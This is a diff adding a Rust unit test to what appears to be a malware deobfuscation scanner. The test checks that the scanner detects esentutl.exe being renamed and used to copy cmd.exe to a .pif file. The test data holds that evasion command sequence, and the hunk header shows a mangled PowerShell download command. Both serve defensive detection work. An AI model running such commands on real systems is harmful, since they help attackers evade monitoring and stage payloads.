@@ -33259,6 +33259,44 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_esentutl_alias_in_deob_text_replays_copy_arguments() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\esentutl.exe C:\Users\Public\esent.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\esentutl.exe"#.to_string(),
+            dst: r#"C:\Users\Public\esent.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\esent.tmp /y C:\Windows\System32\cmd.exe /d C:\Users\Public\run.pif /o"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\esent.tmp"#
+                )
+            }),
+            "copied esentutl alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WindowsUtilManip { cmd, src, dst }
+                        if cmd == r#"esentutl.exe /y C:\Windows\System32\cmd.exe /d C:\Users\Public\run.pif /o"#
+                            && src == r#"C:\Windows\System32\cmd.exe"#
+                            && dst == r#"C:\Users\Public\run.pif"#
+                )
+            }),
+            "copied esentutl alias did not replay copy arguments: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_msiexec_alias_in_deob_text_emits_package_url_argument() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
